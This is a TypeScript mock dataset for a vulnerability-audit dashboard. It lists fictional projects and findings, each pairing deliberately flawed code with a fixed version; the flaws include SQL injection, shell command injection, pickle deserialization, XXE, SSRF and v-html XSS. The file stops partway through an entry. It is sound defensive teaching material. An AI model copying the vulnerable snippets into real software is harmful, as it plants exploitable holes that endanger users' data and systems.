import type { Project } from '@/types/project'
import type { Vuln } from '@/types/vuln'
import type { AuditRecord } from '@/types/audit'

/**
 * Mock dataset. Every code snippet is real (or close to real) code that
 * actually exhibits the vulnerability, so the workbench feels grounded.
 *
 * Distribution: 25 vulns across 5 projects, mix of severities and statuses.
 */

export const projects: Project[] = [
  {
    id: 'proj-user-service',
    name: 'user-service',
    language: 'java',
    framework: 'Spring Boot 3.2',
    businessLine: 'Account',
    owner: 'huang.qiang',
    repositoryUrl: 'git@gitlab.code-sec.io:account/user-service.git',
    totalLines: 84210,
    lastScanAt: '2026-06-28T03:14:00Z',
    status: 'active',
    vulnCount: 6,
    criticalCount: 1,
    highCount: 2,
    mediumCount: 2,
    lowCount: 1,
    fixRate: 0.83,
  },
  {
    id: 'proj-payment-gateway',
    name: 'payment-gateway',
    language: 'go',
    framework: 'Gin 1.9',
    businessLine: 'Payments',
    owner: 'li.meng',
    repositoryUrl: 'git@gitlab.code-sec.io:payments/payment-gateway.git',
    totalLines: 52100,
    lastScanAt: '2026-06-28T03:18:00Z',
    status: 'active',
    vulnCount: 5,
    criticalCount: 1,
    highCount: 2,
    mediumCount: 1,
    lowCount: 1,
    fixRate: 0.6,
  },
  {
    id: 'proj-notification-center',
    name: 'notification-center',
    language: 'python',
    framework: 'FastAPI 0.111',
    businessLine: 'Platform',
    owner: 'wang.lei',
    repositoryUrl: 'git@gitlab.code-sec.io:platform/notification-center.git',
    totalLines: 38940,
    lastScanAt: '2026-06-27T22:05:00Z',
    status: 'active',
    vulnCount: 5,
    criticalCount: 0,
    highCount: 1,
    mediumCount: 3,
    lowCount: 1,
    fixRate: 0.4,
  },
  {
    id: 'proj-admin-portal',
    name: 'admin-portal',
    language: 'typescript',
    framework: 'Vue 3.4',
    businessLine: 'Internal',
    owner: 'zhang.jing',
    repositoryUrl: 'git@gitlab.code-sec.io:internal/admin-portal.git',
    totalLines: 41800,
    lastScanAt: '2026-06-28T01:42:00Z',
    status: 'active',
    vulnCount: 5,
    criticalCount: 0,
    highCount: 2,
    mediumCount: 2,
    lowCount: 1,
    fixRate: 0.2,
  },
  {
    id: 'proj-data-pipeline',
    name: 'data-pipeline',
    language: 'java',
    framework: 'Apache Flink 1.18',
    businessLine: 'Data',
    owner: 'chen.wei',
    repositoryUrl: 'git@gitlab.code-sec.io:data/data-pipeline.git',
    totalLines: 67520,
    lastScanAt: '2026-06-28T03:30:00Z',
    status: 'active',
    vulnCount: 4,
    criticalCount: 1,
    highCount: 1,
    mediumCount: 1,
    lowCount: 1,
    fixRate: 0.5,
  },
]

export const vulns: Vuln[] = [
  // ---------- user-service (Java / Spring Boot) ----------
  {
    id: 'vuln-001',
    projectId: 'proj-user-service',
    ruleId: 'java/sql-injection-001',
    title: 'SQL injection in user lookup',
    severity: 'critical',
    status: 'pending_audit',
    exploitability: 'EXPLOITABLE',
    exploitReason: '参数 userId 来自 @RequestParam，直接拼接到 SQL 语句中，无任何校验或转义',
    filePath: 'src/main/java/com/codesec/account/dao/UserDao.java',
    lineStart: 42,
    lineEnd: 49,
    codeSnippet: `public User findById(String userId) {
    String sql = "SELECT id, email, status FROM users WHERE id = '" + userId + "'";
    Connection conn = dataSource.getConnection();
    try (Statement st = conn.createStatement();
         ResultSet rs = st.executeQuery(sql)) {
        return mapRow(rs);
    } catch (SQLException e) {
        log.error("lookup failed", e);
        throw new DataAccessException(e);
    }
}`,
    description: 'User input is concatenated into a raw SQL string. An attacker can break out of the literal and execute arbitrary statements.',
    fixSuggestion: 'Use a parameterized PreparedStatement; never concatenate untrusted input.',
    fixCodeSnippet: `public User findById(String userId) {
    String sql = "SELECT id, email, status FROM users WHERE id = ?";
    try (Connection conn = dataSource.getConnection();
         PreparedStatement ps = conn.prepareStatement(sql)) {
        ps.setString(1, userId);
        try (ResultSet rs = ps.executeQuery()) {
            return mapRow(rs);
        }
    } catch (SQLException e) {
        throw new DataAccessException(e);
    }
}`,
    fixLanguage: 'java',
    cwe: 'CWE-89',
    cve: null,
    engine: 'self_sast',
    engines: ['self_sast', 'codeql'],
    discoveredAt: '2026-06-27T08:14:00Z',
    discoveredBy: 'self_sast@1.4.2',
    assignee: null,
    deadline: '2026-06-29T08:14:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-002',
    projectId: 'proj-user-service',
    ruleId: 'java/hardcoded-secret-001',
    title: 'Hardcoded JWT signing key',
    severity: 'critical',
    status: 'confirmed',
    exploitability: 'EXPLOITABLE',
    exploitReason: '生产签名密钥硬编码在源码中；任何具备仓库读权限的人都能伪造任意用户的访问令牌',
    filePath: 'src/main/java/com/codesec/account/security/JwtIssuer.java',
    lineStart: 18,
    lineEnd: 25,
    codeSnippet: `@Component
public class JwtIssuer {
    private static final String SIGNING_KEY = "sk_live_REPLACED_WITH_PLACEHOLDER";
    private static final long TTL_SECONDS = 3600L;

    public String issue(long userId, String role) {
        return Jwts.builder()
            .setSubject(String.valueOf(userId))
            .claim("role", role)
            .setExpiration(new Date(System.currentTimeMillis() + TTL_SECONDS * 1000))
            .signWith(SignatureAlgorithm.HS256, SIGNING_KEY)
            .compact();
    }
}`,
    description: 'Production signing key is hardcoded in source. The key grants the ability to mint valid access tokens for any user.',
    fixSuggestion: 'Load the key from a secrets manager (AWS KMS, Vault) or environment variable injected at deploy time.',
    fixCodeSnippet: `@Component
public class JwtIssuer {
    private final String signingKey;

    public JwtIssuer(@Value("\${security.jwt.signing-key}") String signingKey) {
        this.signingKey = signingKey;
    }

    public String issue(long userId, String role) {
        long now = System.currentTimeMillis();
        return Jwts.builder()
            .setSubject(String.valueOf(userId))
            .claim("role", role)
            .setExpiration(new Date(now + 3_600_000))
            .signWith(SignatureAlgorithm.HS256, signingKey)
            .compact();
    }
}`,
    fixLanguage: 'java',
    cwe: 'CWE-798',
    cve: null,
    engine: 'self_sast',
    engines: ['self_sast', 'sonar'],
    discoveredAt: '2026-06-25T11:02:00Z',
    discoveredBy: 'self_sast@1.4.2',
    assignee: 'zhang.jing',
    deadline: '2026-06-26T11:02:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-003',
    projectId: 'proj-user-service',
    ruleId: 'java/weak-crypto-002',
    title: 'MD5 used for password hashing',
    severity: 'high',
    status: 'pending_audit',
    exploitability: 'POTENTIALLY_EXPLOITABLE',
    exploitReason: '调用链未覆盖 PasswordService 入口；MD5 命中规则但需人工确认是否参与登录流程',
    filePath: 'src/main/java/com/codesec/account/service/PasswordService.java',
    lineStart: 12,
    lineEnd: 20,
    codeSnippet: `public String hash(String raw) {
    try {
        MessageDigest md = MessageDigest.getInstance("MD5");
        byte[] digest = md.digest(raw.getBytes(StandardCharsets.UTF_8));
        return HexFormat.of().formatHex(digest);
    } catch (NoSuchAlgorithmException e) {
        throw new IllegalStateException(e);
    }
}`,
    description: 'MD5 is cryptographically broken for password storage. Use Argon2id or bcrypt with a per-user salt.',
    fixSuggestion: 'Replace with Argon2id (org.bouncycastle.crypto.generators.Argon2BytesGenerator) or at minimum bcrypt.',
    fixCodeSnippet: `private final Argon2BytesGenerator argon2 = new Argon2BytesGenerator();
private final SecureRandom random = new SecureRandom();

public String hash(String raw) {
    byte[] salt = new byte[16];
    random.nextBytes(salt);
    argon2.init(new Argon2Parameters.Builder(Argon2Parameters.ARGON2_id)
        .withSalt(salt)
        .withIterations(3)
        .withMemoryAsKB(65536)
        .withParallelism(2)
        .build());
    byte[] out = new byte[32];
    argon2.generateBytes(raw.getBytes(StandardCharsets.UTF_8), out);
    return Base64.getEncoder().encodeToString(salt) + ":" +
           Base64.getEncoder().encodeToString(out);
}`,
    fixLanguage: 'java',
    cwe: 'CWE-327',
    cve: null,
    engine: 'sonar',
    engines: ['sonar', 'codeql'],
    discoveredAt: '2026-06-26T19:44:00Z',
    discoveredBy: 'sonar@10.3',
    assignee: null,
    deadline: '2026-07-03T19:44:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-004',
    projectId: 'proj-user-service',
    ruleId: 'java/xxe-001',
    title: 'XML parser vulnerable to XXE',
    severity: 'high',
    status: 'pending_retest',
    exploitability: 'EXPLOITABLE',
    exploitReason: 'DocumentBuilder 使用默认配置，未禁用外部实体；攻击者可注入 DOCTYPE 触发文件读取',
    filePath: 'src/main/java/com/codesec/account/integration/SamlParser.java',
    lineStart: 33,
    lineEnd: 41,
    codeSnippet: `public SamlResponse parse(InputStream xml) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(xml);
    return SamlResponse.from(doc.getDocumentElement());
}`,
    description: 'Default DocumentBuilderFactory allows external entity expansion, enabling file disclosure and SSRF.',
    fixSuggestion: 'Disable DOCTYPE declarations and external entities; or switch to a safe parser like Jackson with JAXB.',
    fixCodeSnippet: `public SamlResponse parse(InputStream xml) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    dbf.setXIncludeAware(false);
    dbf.setExpandEntityReferences(false);
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(xml);
    return SamlResponse.from(doc.getDocumentElement());
}`,
    fixLanguage: 'java',
    cwe: 'CWE-611',
    cve: null,
    engine: 'codeql',
    engines: ['codeql', 'self_sast'],
    discoveredAt: '2026-06-20T14:11:00Z',
    discoveredBy: 'codeql@2.16.2',
    assignee: 'huang.qiang',
    deadline: '2026-06-27T14:11:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-005',
    projectId: 'proj-user-service',
    ruleId: 'java/log-injection-001',
    title: 'Log injection via unsanitized username',
    severity: 'medium',
    status: 'pending_audit',
    exploitability: 'POTENTIALLY_EXPLOITABLE',
    exploitReason: '用户名拼接进日志，攻击者可通过换行符伪造日志条目掩盖自身操作',
    filePath: 'src/main/java/com/codesec/account/controller/AuthController.java',
    lineStart: 71,
    lineEnd: 78,
    codeSnippet: `@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest req) {
    User u = userService.findByEmail(req.getEmail());
    if (u == null) {
        log.warn("login failed for email=" + req.getEmail() + " ip=" + clientIp());
        return ResponseEntity.status(401).build();
    }
    // ...
}`,
    description: 'Concatenating user input into log messages allows log forgery. Use structured logging with separate fields.',
    fixSuggestion: 'Use SLF4J parameterized logging or MDC; never concatenate untrusted input into the log message.',
    fixCodeSnippet: `@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest req) {
    User u = userService.findByEmail(req.getEmail());
    if (u == null) {
        MDC.put("email", req.getEmail());
        MDC.put("ip", clientIp());
        log.warn("login failed: user not found");
        MDC.clear();
        return ResponseEntity.status(401).build();
    }
    // ...
}`,
    fixLanguage: 'java',
    cwe: 'CWE-117',
    cve: null,
    engine: 'self_sast',
    engines: ['self_sast'],
    discoveredAt: '2026-06-26T07:33:00Z',
    discoveredBy: 'self_sast@1.4.2',
    assignee: null,
    deadline: '2026-07-26T07:33:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-006',
    projectId: 'proj-user-service',
    ruleId: 'java/open-redirect-001',
    title: 'Open redirect on logout',
    severity: 'low',
    status: 'false_positive',
    exploitability: 'NOT_EXPLOITABLE',
    exploitReason: 'redirect 目标在白名单前缀校验后才跳转，外部域名无法绕过',
    filePath: 'src/main/java/com/codesec/account/controller/LogoutController.java',
    lineStart: 24,
    lineEnd: 32,
    codeSnippet: `@GetMapping("/logout/return")
public void returnAfterLogout(@RequestParam String returnTo, HttpServletResponse resp) {
    if (returnTo.startsWith(TRUSTED_ORIGIN_PREFIX)) {
        resp.sendRedirect(returnTo);
    } else {
        resp.sendRedirect("/");
    }
}`,
    description: 'Unvalidated redirect parameter. Note: pre-audit, this looked like a flaw, but the prefix check makes it safe.',
    fixSuggestion: 'No fix required. Maintain a strict allowlist of trusted redirect targets.',
    fixCodeSnippet: `// Current implementation is correct — allowlist prefix check is sufficient.
// Keep this code as a reference for similar checks elsewhere.`,
    fixLanguage: 'java',
    cwe: 'CWE-601',
    cve: null,
    engine: 'self_sast',
    engines: ['self_sast'],
    discoveredAt: '2026-06-18T10:00:00Z',
    discoveredBy: 'self_sast@1.4.2',
    assignee: 'zhang.jing',
    deadline: null,
    closedAt: '2026-06-22T15:30:00Z',
  },

  // ---------- payment-gateway (Go / Gin) ----------
  {
    id: 'vuln-007',
    projectId: 'proj-payment-gateway',
    ruleId: 'go/sql-injection-001',
    title: 'SQL injection in order history',
    severity: 'critical',
    status: 'pending_audit',
    exploitability: 'EXPLOITABLE',
    exploitReason: 'fmt.Sprintf 直接把 URL 路径参数拼进 SQL，未做任何转义或参数化',
    filePath: 'internal/order/repository.go',
    lineStart: 56,
    lineEnd: 64,
    codeSnippet: `func (r *Repository) ListByUser(ctx context.Context, userID string) ([]Order, error) {
    query := fmt.Sprintf("SELECT id, amount, status FROM orders WHERE user_id = '%s' ORDER BY created_at DESC", userID)
    rows, err := r.db.QueryContext(ctx, query)
    if err != nil {
        return nil, err
    }
    defer rows.Close()
    return scanOrders(rows)
}`,
    description: 'User-controlled userID is formatted directly into the SQL string, allowing injection through any URL path component.',
    fixSuggestion: 'Use parameterized queries with $1 placeholders. Never build SQL with fmt.Sprintf.',
    fixCodeSnippet: `func (r *Repository) ListByUser(ctx context.Context, userID string) ([]Order, error) {
    const query = \`SELECT id, amount, status FROM orders
                   WHERE user_id = $1 ORDER BY created_at DESC\`
    rows, err := r.db.QueryContext(ctx, query, userID)
    if err != nil {
        return nil, err
    }
    defer rows.Close()
    return scanOrders(rows)
}`,
    fixLanguage: 'go',
    cwe: 'CWE-89',
    cve: null,
    engine: 'gosec',
    engines: ['gosec', 'self_sast'],
    discoveredAt: '2026-06-27T05:21:00Z',
    discoveredBy: 'gosec@2.18.2',
    assignee: null,
    deadline: '2026-06-28T05:21:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-008',
    projectId: 'proj-payment-gateway',
    ruleId: 'go/insecure-tls-001',
    title: 'Insecure TLS configuration on outbound calls',
    severity: 'high',
    status: 'pending_audit',
    exploitability: 'POTENTIALLY_EXPLOITABLE',
    exploitReason: 'TLS 校验被关闭，但实际可利用性取决于网络位置；需人工审计内网隔离策略',
    filePath: 'internal/acquirer/client.go',
    lineStart: 21,
    lineEnd: 33,
    codeSnippet: `func NewClient(endpoint string) *Client {
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        MaxIdleConns:    50,
        IdleConnTimeout: 90 * time.Second,
    }
    return &Client{
        httpClient: &http.Client{Transport: tr, Timeout: 10 * time.Second},
        endpoint:   endpoint,
    }
}`,
    description: 'TLS verification is disabled, allowing man-in-the-middle attacks against the payment acquirer integration.',
    fixSuggestion: 'Remove InsecureSkipVerify. If using a private CA, provide the CA bundle via tls.Config.RootCAs.',
    fixCodeSnippet: `func NewClient(endpoint string, caCert []byte) (*Client, error) {
    pool := x509.NewCertPool()
    if !pool.AppendCertsFromPEM(caCert) {
        return nil, errors.New("invalid CA bundle")
    }
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{
            RootCAs:    pool,
            MinVersion: tls.VersionTLS12,
        },
        MaxIdleConns:    50,
        IdleConnTimeout: 90 * time.Second,
    }
    return &Client{
        httpClient: &http.Client{Transport: tr, Timeout: 10 * time.Second},
        endpoint:   endpoint,
    }, nil
}`,
    fixLanguage: 'go',
    cwe: 'CWE-295',
    cve: null,
    engine: 'gosec',
    engines: ['gosec', 'codeql'],
    discoveredAt: '2026-06-26T22:18:00Z',
    discoveredBy: 'gosec@2.18.2',
    assignee: null,
    deadline: '2026-07-03T22:18:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-009',
    projectId: 'proj-payment-gateway',
    ruleId: 'go/path-traversal-001',
    title: 'Path traversal in receipt download',
    severity: 'high',
    status: 'fixing',
    exploitability: 'EXPLOITABLE',
    exploitReason: 'filepath.Join 不阻断 ../ 段；攻击者可通过路径遍历读取宿主机任意可读文件',
    filePath: 'internal/receipt/handler.go',
    lineStart: 44,
    lineEnd: 52,
    codeSnippet: `func (h *Handler) Download(c *gin.Context) {
    name := c.Param("filename")
    full := filepath.Join(h.baseDir, name)
    c.File(full)
}`,
    description: 'The filename path parameter is joined with the base directory but not sanitized, allowing ../ to escape the receipts folder.',
    fixSuggestion: 'Resolve the joined path and verify it stays within baseDir using filepath.Rel or os.Root (Go 1.24+).',
    fixCodeSnippet: `func (h *Handler) Download(c *gin.Context) {
    name := filepath.Base(c.Param("filename"))
    if name == "" || name == "." || name == ".." {
        c.AbortWithStatus(http.StatusBadRequest)
        return
    }
    full := filepath.Join(h.baseDir, name)
    rel, err := filepath.Rel(h.baseDir, full)
    if err != nil || strings.HasPrefix(rel, "..") {
        c.AbortWithStatus(http.StatusForbidden)
        return
    }
    c.File(full)
}`,
    fixLanguage: 'go',
    cwe: 'CWE-22',
    cve: null,
    engine: 'gosec',
    engines: ['gosec'],
    discoveredAt: '2026-06-22T09:05:00Z',
    discoveredBy: 'gosec@2.18.2',
    assignee: 'li.meng',
    deadline: '2026-06-29T09:05:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-010',
    projectId: 'proj-payment-gateway',
    ruleId: 'go/weak-rand-001',
    title: 'math/rand used for security token',
    severity: 'medium',
    status: 'pending_audit',
    exploitability: 'POTENTIALLY_EXPLOITABLE',
    exploitReason: 'math/rand 非密码学安全；采样足够多时序列可预测，无法用于安全令牌',
    filePath: 'internal/idem/store.go',
    lineStart: 18,
    lineEnd: 24,
    codeSnippet: `func newID() string {
    b := make([]byte, 16)
    for i := range b {
        b[i] = byte(rand.Intn(256))
    }
    return hex.EncodeToString(b)
}`,
    description: 'math/rand is seeded with a deterministic source. Use crypto/rand for any security-relevant token.',
    fixSuggestion: 'Replace with crypto/rand.Read for unpredictable random bytes.',
    fixCodeSnippet: `import "crypto/rand"

func newID() (string, error) {
    b := make([]byte, 16)
    if _, err := rand.Read(b); err != nil {
        return "", err
    }
    return hex.EncodeToString(b), nil
}`,
    fixLanguage: 'go',
    cwe: 'CWE-338',
    cve: null,
    engine: 'gosec',
    engines: ['gosec'],
    discoveredAt: '2026-06-24T12:40:00Z',
    discoveredBy: 'gosec@2.18.2',
    assignee: null,
    deadline: '2026-07-24T12:40:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-011',
    projectId: 'proj-payment-gateway',
    ruleId: 'go/error-info-disclosure-001',
    title: 'Stack trace returned to client',
    severity: 'low',
    status: 'pending_audit',
    exploitability: 'NOT_EXPLOITABLE',
    exploitReason: 'debug 模式由 feature flag 控制；生产环境不会返回堆栈，无实际利用面',
    filePath: 'internal/http/errors.go',
    lineStart: 12,
    lineEnd: 21,
    codeSnippet: `func writeErr(c *gin.Context, err error) {
    if cfg.DebugMode {
        c.JSON(http.StatusInternalServerError, gin.H{
            "error":   err.Error(),
            "trace":   string(debug.Stack()),
            "request": c.Request.URL.Path,
        })
        return
    }
    c.JSON(http.StatusInternalServerError, gin.H{"error": "internal error"})
}`,
    description: 'Stack traces can leak internal paths and library versions to clients.',
    fixSuggestion: 'Ensure debug mode is never enabled in production. Log the full error server-side, return a generic message to clients.',
    fixCodeSnippet: `func writeErr(c *gin.Context, err error) {
    log.Error("request failed",
        "path", c.Request.URL.Path,
        "err", err,
    )
    c.JSON(http.StatusInternalServerError, gin.H{"error": "internal error"})
}`,
    fixLanguage: 'go',
    cwe: 'CWE-209',
    cve: null,
    engine: 'self_sast',
    engines: ['self_sast'],
    discoveredAt: '2026-06-15T16:00:00Z',
    discoveredBy: 'self_sast@1.4.2',
    assignee: null,
    deadline: null,
    closedAt: null,
  },

  // ---------- notification-center (Python / FastAPI) ----------
  {
    id: 'vuln-012',
    projectId: 'proj-notification-center',
    ruleId: 'python/ssrf-001',
    title: 'SSRF in webhook fetcher',
    severity: 'high',
    status: 'pending_audit',
    exploitability: 'EXPLOITABLE',
    exploitReason: 'webhook URL 未校验 host 或 scheme；攻击者可指定内网 IP 或云元数据地址 169.254.169.254',
    filePath: 'app/services/webhook.py',
    lineStart: 23,
    lineEnd: 35,
    codeSnippet: `import httpx

async def verify_webhook(url: str) -> dict:
    async with httpx.AsyncClient(timeout=5) as client:
        r = await client.get(url, follow_redirects=True)
    return {"status": r.status_code, "body": r.text[:512]}`,
    description: 'Server-side request forgery: any internal IP or cloud metadata endpoint can be reached by the application on the attacker\u2019s behalf.',
    fixSuggestion: 'Resolve the hostname, check it is not in a private/loopback range, and reject non-HTTPS schemes.',
    fixCodeSnippet: `import ipaddress
import socket
import httpx

PRIVATE_NETS = [ipaddress.ip_network(n) for n in (
    "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "127.0.0.0/8", "169.254.0.0/16", "::1/128",
)]

async def verify_webhook(url: str) -> dict:
    parsed = httpx.URL(url)
    if parsed.scheme != "https":
        raise ValueError("https required")
    infos = await asyncio.get_running_loop().getaddrinfo(parsed.host, None)
    for info in infos:
        ip = ipaddress.ip_address(info[4][0])
        if any(ip in n for n in PRIVATE_NETS):
            raise ValueError("private address blocked")
    async with httpx.AsyncClient(timeout=5) as client:
        r = await client.get(url, follow_redirects=False)
    return {"status": r.status_code}`,
    fixLanguage: 'python',
    cwe: 'CWE-918',
    cve: null,
    engine: 'bandit',
    engines: ['bandit', 'self_sast'],
    discoveredAt: '2026-06-26T18:11:00Z',
    discoveredBy: 'bandit@1.7.8',
    assignee: null,
    deadline: '2026-07-03T18:11:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-013',
    projectId: 'proj-notification-center',
    ruleId: 'python/deserialization-001',
    title: 'pickle.loads on untrusted data',
    severity: 'critical',
    status: 'confirmed',
    exploitability: 'EXPLOITABLE',
    exploitReason: 'pickle.loads 是已知的 Python RCE 原语；构造 payload 即可在 worker 上执行任意代码',
    filePath: 'app/tasks/queue.py',
    lineStart: 41,
    lineEnd: 47,
    codeSnippet: `import pickle

def deserialize(payload: bytes) -> dict:
    return pickle.loads(payload)`,
    description: 'pickle.loads on untrusted input is a remote code execution vulnerability. There is no safe way to sandbox pickle.',
    fixSuggestion: 'Use json for cross-process payloads. If you need Python objects, use msgpack or protobuf with a strict schema.',
    fixCodeSnippet: `import json
import msgspec.json

def deserialize(payload: bytes) -> dict:
    return msgspec.json.decode(payload)`,
    fixLanguage: 'python',
    cwe: 'CWE-502',
    cve: null,
    engine: 'bandit',
    engines: ['bandit', 'codeql'],
    discoveredAt: '2026-06-23T10:00:00Z',
    discoveredBy: 'bandit@1.7.8',
    assignee: 'wang.lei',
    deadline: '2026-06-24T10:00:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-014',
    projectId: 'proj-notification-center',
    ruleId: 'python/cmd-injection-001',
    title: 'OS command injection in template preview',
    severity: 'high',
    status: 'pending_audit',
    exploitability: 'EXPLOITABLE',
    exploitReason: 'shell=True 且用户输入直接拼入命令参数；通过 template_name 字段可触发命令执行',
    filePath: 'app/services/preview.py',
    lineStart: 17,
    lineEnd: 26,
    codeSnippet: `import subprocess

def render_preview(template_name: str, data: dict) -> str:
    json_data = json.dumps(data)
    out = subprocess.check_output(
        f"node render.js {template_name} '{json_data}'",
        shell=True,
        cwd="/opt/preview",
    )
    return out.decode()`,
    description: 'shell=True with string interpolation allows command injection through template_name or the data fields.',
    fixSuggestion: 'Pass arguments as a list to subprocess.run, never with shell=True.',
    fixCodeSnippet: `import subprocess
import json

def render_preview(template_name: str, data: dict) -> str:
    if not template_name.replace("_", "").replace("-", "").isalnum():
        raise ValueError("invalid template name")
    json_data = json.dumps(data)
    out = subprocess.run(
        ["node", "render.js", template_name, json_data],
        cwd="/opt/preview",
        capture_output=True,
        check=True,
        timeout=10,
    )
    return out.stdout.decode()`,
    fixLanguage: 'python',
    cwe: 'CWE-78',
    cve: null,
    engine: 'bandit',
    engines: ['bandit'],
    discoveredAt: '2026-06-25T13:50:00Z',
    discoveredBy: 'bandit@1.7.8',
    assignee: null,
    deadline: '2026-07-02T13:50:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-015',
    projectId: 'proj-notification-center',
    ruleId: 'python/jwt-none-001',
    title: 'JWT verify with algorithm allowlist missing',
    severity: 'medium',
    status: 'pending_audit',
    exploitability: 'POTENTIALLY_EXPLOITABLE',
    exploitReason: 'PyJWT 解码未指定 algorithms 白名单；需要人工审计当前 issuer 的签名算法',
    filePath: 'app/middleware/auth.py',
    lineStart: 22,
    lineEnd: 30,
    codeSnippet: `import jwt

def verify(token: str) -> dict:
    return jwt.decode(token, SECRET, options={"verify_aud": False})`,
    description: 'Without an algorithm allowlist, PyJWT can be tricked into accepting tokens with alg=none, bypassing signature verification.',
    fixSuggestion: 'Specify algorithms=["HS256"] (or whatever your issuer signs with) to the decode call.',
    fixCodeSnippet: `import jwt

def verify(token: str) -> dict:
    return jwt.decode(
        token,
        SECRET,
        algorithms=["HS256"],
        options={"verify_aud": False, "require": ["exp", "sub"]},
    )`,
    fixLanguage: 'python',
    cwe: 'CWE-347',
    cve: null,
    engine: 'bandit',
    engines: ['bandit', 'self_sast'],
    discoveredAt: '2026-06-24T08:22:00Z',
    discoveredBy: 'bandit@1.7.8',
    assignee: null,
    deadline: '2026-07-24T08:22:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-016',
    projectId: 'proj-notification-center',
    ruleId: 'python/weak-hash-001',
    title: 'SHA-1 used for content fingerprint',
    severity: 'low',
    status: 'pending_audit',
    exploitability: 'NOT_EXPLOITABLE',
    exploitReason: 'SHA-1 碰撞风险对非对抗场景仅理论存在；该指纹仅用于去重，不参与信任决策',
    filePath: 'app/services/attachments.py',
    lineStart: 14,
    lineEnd: 19,
    codeSnippet: `import hashlib

def fingerprint(content: bytes) -> str:
    return hashlib.sha1(content).hexdigest()`,
    description: 'SHA-1 is deprecated for cryptographic use. For non-security fingerprinting it is still acceptable, but switching to SHA-256 has no cost.',
    fixSuggestion: 'Switch to SHA-256. Keep the digest purpose explicit in the docstring.',
    fixCodeSnippet: `import hashlib

def fingerprint(content: bytes) -> str:
    """Stable, non-cryptographic content fingerprint for de-duplication."""
    return hashlib.sha256(content).hexdigest()`,
    fixLanguage: 'python',
    cwe: 'CWE-327',
    cve: null,
    engine: 'bandit',
    engines: ['bandit'],
    discoveredAt: '2026-06-17T11:00:00Z',
    discoveredBy: 'bandit@1.7.8',
    assignee: null,
    deadline: null,
    closedAt: null,
  },

  // ---------- admin-portal (Vue 3 / TypeScript) ----------
  {
    id: 'vuln-017',
    projectId: 'proj-admin-portal',
    ruleId: 'ts/xss-vue-001',
    title: 'XSS via v-html on user content',
    severity: 'high',
    status: 'pending_audit',
    exploitability: 'EXPLOITABLE',
    exploitReason: 'v-html 直接渲染原始 HTML；客服备注由用户控制且未做净化，可触发存储型 XSS',
    filePath: 'src/views/tickets/Detail.vue',
    lineStart: 88,
    lineEnd: 95,
    codeSnippet: `<template>
  <a-card title="Customer note">
    <div v-html="ticket.note"></div>
  </a-card>
</template>

<script setup lang="ts">
import type { Ticket } from '@/api/tickets'
const props = defineProps<{ ticket: Ticket }>()
</script>`,
    description: 'v-html bypasses Vue\u2019s template escaping, allowing stored XSS in any user-controlled field.',
    fixSuggestion: 'Render the text content directly. If formatting is required, sanitize with DOMPurify before binding to v-html.',
    fixCodeSnippet: `<template>
  <a-card title="Customer note">
    <div class="cs-note" v-html="sanitizedNote"></div>
  </a-card>
</template>

<script setup lang="ts">
import DOMPurify from 'dompurify'
import { computed } from 'vue'
import type { Ticket } from '@/api/tickets'

const props = defineProps<{ ticket: Ticket }>()
const sanitizedNote = computed(() =>
  DOMPurify.sanitize(props.ticket.note, { USE_PROFILES: { html: true } }),
)
</script>`,
    fixLanguage: 'typescript',
    cwe: 'CWE-79',
    cve: null,
    engine: 'self_sast',
    engines: ['self_sast', 'sonar'],
    discoveredAt: '2026-06-26T15:30:00Z',
    discoveredBy: 'self_sast@1.4.2',
    assignee: null,
    deadline: '2026-07-03T15:30:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-018',
    projectId: 'proj-admin-portal',
    ruleId: 'ts/open-redirect-ts-001',
    title: 'Open redirect on SSO callback',
    severity: 'medium',
    status: 'pending_audit',
    exploitability: 'POTENTIALLY_EXPLOITABLE',
    exploitReason: 'returnTo 参数从 query 读取后直接 router.replace；可被用于构造针对员工的钓鱼跳转',
    filePath: 'src/views/auth/Callback.vue',
    lineStart: 19,
    lineEnd: 28,
    codeSnippet: `<script setup lang="ts">
import { onMounted } from 'vue'
import { useRoute, useRouter } from 'vue-router'

const route = useRoute()
const router = useRouter()

onMounted(() => {
  const returnTo = (route.query.returnTo as string) ?? '/dashboard'
  router.replace(returnTo)
})
</script>`,
    description: 'Open redirect in the SSO callback. An attacker can craft a link that bounces staff to an external phishing page after login.',
    fixSuggestion: 'Restrict returnTo to known internal paths only. Reject anything containing a protocol or external host.',
    fixCodeSnippet: `<script setup lang="ts">
import { onMounted } from 'vue'
import { useRoute, useRouter } from 'vue-router'

const route = useRoute()
const router = useRouter()

const SAFE_PREFIX = ['/dashboard', '/projects', '/audits']

onMounted(() => {
  const raw = (route.query.returnTo as string) ?? '/dashboard'
  const safe = SAFE_PREFIX.find((p) => raw.startsWith(p)) ?? '/dashboard'
  router.replace(safe)
})
</script>`,
    fixLanguage: 'typescript',
    cwe: 'CWE-601',
    cve: null,
    engine: 'self_sast',
    engines: ['self_sast'],
    discoveredAt: '2026-06-23T14:08:00Z',
    discoveredBy: 'self_sast@1.4.2',
    assignee: null,
    deadline: '2026-07-23T14:08:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-019',
    projectId: 'proj-admin-portal',
